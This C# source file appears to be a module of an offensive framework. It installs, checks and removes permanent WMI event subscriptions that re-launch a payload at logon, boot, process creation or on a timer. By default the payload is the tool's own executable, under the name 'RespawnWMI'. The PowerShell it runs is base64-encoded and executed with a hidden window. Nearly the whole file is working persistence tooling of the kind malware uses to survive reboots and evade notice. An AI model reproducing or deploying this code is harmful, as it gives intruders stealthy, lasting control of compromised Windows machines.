using System;
using System.IO;
using System.Linq;
using System.Diagnostics;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string DefaultSubName = "RespawnWMI";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    Standard: R2 wmi Start {DefaultSubName} logon cmdline {defaultPayload}\n" +
                   $"    Timer:    R2 wmi Start {DefaultSubName} timer 30 cmdline {defaultPayload}\n" +
                   $"    (Triggers: 'logon', 'boot', 'process', 'timer')\n" +
                   $"    (Consumers: 'cmdline', 'script')";
        }

        public static string Start(string[] args)
        {
            string subName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultSubName;

            string triggerType = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : "logon";

            string consumerType = "cmdline";
            string payload = GetDefaultPayloadPath();
            string interval = "10";

            if (triggerType.Equals("timer", StringComparison.OrdinalIgnoreCase))
            {
                if (args != null && args.Length >= 5 && int.TryParse(args[2], out _))
                {
                    interval = args[2];
                    consumerType = args[3];
                    payload = string.Join(" ", args.Skip(4)).Trim('"', '\'');
                }
                else
                {
                    consumerType = (args != null && args.Length > 2) ? args[2] : "cmdline";
                    payload = (args != null && args.Length > 3) ? string.Join(" ", args.Skip(3)).Trim('"', '\'') : GetDefaultPayloadPath();
                    interval = (args != null && args.Length > 4) ? args[4] : "10";
                }
            }
            else
            {
                consumerType = (args != null && args.Length > 2) ? args[2] : "cmdline";
                payload = (args != null && args.Length > 3) ? string.Join(" ", args.Skip(3)).Trim('"', '\'') : GetDefaultPayloadPath();
            }

            try
            {
                if (FilterExists(subName))
                    return $"[*] WMI subscription '{subName}' already exists.";

                bool isTimer = triggerType.Equals("timer", StringComparison.OrdinalIgnoreCase);
                string wqlQuery = isTimer
                    ? $"SELECT * FROM __TimerEvent WHERE TimerID = ''{subName}''"
                    : GetWqlQuery(triggerType);

                if (string.IsNullOrEmpty(wqlQuery))
                    return $"[-] Could not generate WQL query for trigger '{triggerType}'.";

                string escapedPayload = payload.Replace("'", "''");

                // Construct self-contained PowerShell script matching the manual test
                string psScript = 
                    $"$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{ " +
                    $"    Name = '{subName}'; " +
                    $"    QueryLanguage = 'WQL'; " +
                    $"    Query = '{wqlQuery}'; " +
                    $"    EventNamespace = 'root\\cimv2' " +
                    $"}}; ";

                if (isTimer)
                {
                    if (!int.TryParse(interval, out int seconds) || seconds <= 0)
                        return $"[-] Invalid interval value '{interval}'. Must be a positive integer.";

                    psScript += 
                        $"Set-WmiInstance -Namespace root\\cimv2 -Class __IntervalTimerInstruction -Arguments @{{ " +
                        $"    TimerID = '{subName}'; " +
                        $"    IntervalBetweenEvents = [uint32]({seconds * 1000}); " +
                        $"    SkipIfPassed = $true " +
                        $"}}; ";
                }

                if (consumerType.Equals("cmdline", StringComparison.OrdinalIgnoreCase))
                {
                    psScript += 
                        $"$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{ " +
                        $"    Name = '{subName}'; " +
                        $"    CommandLineTemplate = '{escapedPayload}'; " +
                        $"    RunInteractively = $false; " +
                        $"    KillTimeout = 10 " +
                        $"}}; ";
                }
                else
                {
                    if (!File.Exists(payload))
                        return $"[-] Script payload file not found at: '{payload}'";

                    string scriptText = File.ReadAllText(payload).Replace("'", "''");
                    psScript += 
                        $"$consumer = Set-WmiInstance -Namespace root\\subscription -Class ActiveScriptEventConsumer -Arguments @{{ " +
                        $"    Name = '{subName}'; " +
                        $"    ScriptingEngine = 'VBScript'; " +
                        $"    ScriptText = '{scriptText}'; " +
                        $"    KillTimeout = 10 " +
                        $"}}; ";
                }

                psScript += 
                    $"Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{ " +
                    $"    Filter = $filter.__RELPATH; " +
                    $"    Consumer = $consumer.__RELPATH " +
                    $"}};";

                RunPowerShell(psScript);

                return $"[+] Successfully Installed WMI Subscription '{subName}' | Trigger: '{triggerType}' (Interval: {interval}s) | Consumer: '{consumerType}' | Payload: '{payload}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Permanent WMI subscriptions require administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string subName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultSubName;

            try
            {
                string script = 
                    $"Get-CimInstance -Namespace root\\subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -match '{subName}' -or $_.Consumer -match '{subName}' }} | Remove-CimInstance; " +
                    $"Get-CimInstance -Namespace root\\subscription -ClassName CommandLineEventConsumer -Filter \"Name='{subName}'\" -ErrorAction SilentlyContinue | Remove-CimInstance; " +
                    $"Get-CimInstance -Namespace root\\subscription -ClassName ActiveScriptEventConsumer -Filter \"Name='{subName}'\" -ErrorAction SilentlyContinue | Remove-CimInstance; " +
                    $"Get-CimInstance -Namespace root\\subscription -ClassName __EventFilter -Filter \"Name='{subName}'\" -ErrorAction SilentlyContinue | Remove-CimInstance; " +
                    $"Get-CimInstance -Namespace root\\cimv2 -ClassName __IntervalTimerInstruction -Filter \"TimerID='{subName}'\" -ErrorAction SilentlyContinue | Remove-CimInstance;";

                RunPowerShell(script);

                return $"[+] Successfully removed WMI subscription components for '{subName}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. WMI removal requires administrator privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string subName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : DefaultSubName;

            try
            {
                bool filterExists = FilterExists(subName);
                bool consumerExists = ConsumerExists(subName);
                bool bindingExists = BindingExists(subName);

                if (!filterExists && !consumerExists && !bindingExists)
                    return $"[*] WMI subscription '{subName}' is NOT present.";

                if (!filterExists || !consumerExists || !bindingExists)
                    return $"[-] WMI subscription '{subName}' is incomplete -> Filter: {filterExists} | Consumer: {consumerExists} | Binding: {bindingExists}";

                return $"[+] Verified WMI Subscription '{subName}' -> Filter: OK | Consumer: OK | Binding: OK";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }

        private static string GetWqlQuery(string triggerId)
        {
            return (triggerId ?? string.Empty).ToLower() switch
            {
                "logon"   => "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA ''Win32_LogonSession''",
                "boot"    => "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA ''Win32_ComputerSystem''",
                "process" => "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA ''Win32_Process''",
                _         => string.Empty
            };
        }

        private static bool FilterExists(string name)
        {
            string res = RunPowerShellCapture($"$e = Get-CimInstance -Namespace root\\subscription -ClassName __EventFilter -Filter \"Name=''{name}''\" -ErrorAction SilentlyContinue; if ($e) {{ 'TRUE' }} else {{ 'FALSE' }}");
            return res.Equals("TRUE", StringComparison.OrdinalIgnoreCase);
        }

        private static bool ConsumerExists(string name)
        {
            string res = RunPowerShellCapture($"$c = Get-CimInstance -Namespace root\\subscription -ClassName CommandLineEventConsumer -Filter \"Name=''{name}''\" -ErrorAction SilentlyContinue; $s = Get-CimInstance -Namespace root\\subscription -ClassName ActiveScriptEventConsumer -Filter \"Name=''{name}''\" -ErrorAction SilentlyContinue; if ($c -or $s) {{ 'TRUE' }} else {{ 'FALSE' }}");
            return res.Equals("TRUE", StringComparison.OrdinalIgnoreCase);
        }

        private static bool BindingExists(string name)
        {
            string res = RunPowerShellCapture($"$b = Get-CimInstance -Namespace root\\subscription -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -match '{name}' }}; if ($b) {{ 'TRUE' }} else {{ 'FALSE' }}");
            return res.Equals("TRUE", StringComparison.OrdinalIgnoreCase);
        }

        private static void RunPowerShell(string script)
        {
            // Base64 encode script to prevent argument splitting & escaping issues across cmd/powershell
            byte[] bytes = System.Text.Encoding.Unicode.GetBytes(script);
            string encoded = Convert.ToBase64String(bytes);

            var psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -WindowStyle Hidden -EncodedCommand {encoded}")
            {
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using var p = Process.Start(psi);
            p?.WaitForExit();
        }

        private static string RunPowerShellCapture(string script)
        {
            byte[] bytes = System.Text.Encoding.Unicode.GetBytes(script);
            string encoded = Convert.ToBase64String(bytes);

            var psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -WindowStyle Hidden -EncodedCommand {encoded}")
            {
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            using var p = Process.Start(psi);
            string output = p?.StandardOutput.ReadToEnd() ?? string.Empty;
            p?.WaitForExit();
            return output.Trim();
        }
    }
}